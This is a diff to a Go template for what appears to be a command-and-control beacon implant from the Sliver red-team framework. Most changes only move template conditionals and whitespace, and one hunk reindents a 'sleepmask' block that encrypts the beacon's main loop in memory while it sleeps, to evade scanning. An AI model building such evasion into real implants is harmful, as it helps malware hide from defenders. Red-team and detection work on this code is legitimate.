@@ -35,15 +35,16 @@ import (
 
 	// {{if .Config.IsBeacon}}
 	"sync"
+	// {{end}}
+
 	// {{if eq .Config.GOOS "windows" }}
 	"reflect"
 	"unsafe"
-
+	
 	"golang.org/x/sys/windows"
-
+	
 	// {{end}}
-	// {{end}}
-
+	
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
@@ -158,7 +159,6 @@ func DllUnregisterServer() { main() }
 
 // {{end}}
 
-
 // {{if .Config.IsBeacon}}
 // {{if eq .Config.GOOS "windows" }}
 
@@ -217,7 +217,6 @@ func xorFunc(funcAddr uintptr, funcLength uint32, key byte) { // Could be replac
 
 // {{end}}
 // {{end}}
-
 
 func main() {
 
@@ -281,18 +280,18 @@ func beaconStartup() {
 		log.Printf("Reconnect sleep: %s", reconnect)
 		// {{end}}
 		// {{if eq .Config.GOOS "windows" }}
-		//implemented sleepmask here (https://github.com/BishopFox/sliver/discussions/1171#discussioncomment-6690241)
-		//convert reconnect to uint32
-		reconnectUint32 := uint32(reconnect.Seconds())
-		err := encryptFunc(reflect.ValueOf(beaconMainLoop(beacon)).Pointer(), reconnectUint32)
-		if err != nil {
-			// uncomment below line if you want to see the error
-			//fmt.Println(err)
-			return
-		}
-		// {{if .Config.Debug}}
-		log.Printf("Encrypting function at address 0x%x", reflect.ValueOf(beaconMainLoop).Pointer())
-		// {{end}}
+			//implemented sleepmask here (https://github.com/BishopFox/sliver/discussions/1171#discussioncomment-6690241)
+			//convert reconnect to uint32
+			reconnectUint32 := uint32(reconnect.Seconds())
+			err := encryptFunc(reflect.ValueOf(beaconMainLoop(beacon)).Pointer(), reconnectUint32)
+			if err != nil {
+				// uncomment below line if you want to see the error
+				//fmt.Println(err)
+				return
+			}
+			// {{if .Config.Debug}}
+			log.Printf("Encrypting function at address 0x%x", reflect.ValueOf(beaconMainLoop).Pointer())
+			// {{end}}
 		// {{else}}
 		time.Sleep(reconnect)
 		// {{end}}
